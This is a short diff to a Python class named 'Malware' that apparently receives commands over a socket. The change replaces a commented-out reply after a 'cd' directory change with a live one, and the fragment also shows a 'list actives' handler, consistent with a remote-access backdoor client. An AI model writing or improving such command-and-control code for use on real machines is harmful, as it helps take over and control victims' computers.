@@ -184,7 +184,7 @@ class Malware:
                 if get_cmd.startswith('cd'):  
                     _dir = get_cmd.split(maxsplit=1)[1]  
                     os.chdir(_dir)
-                    # self.sock.send('-'.encode())
+                    self.sock.send(' '.encode())
 
                 elif get_cmd == 'list actives':
                     self.getActives(self.sock)
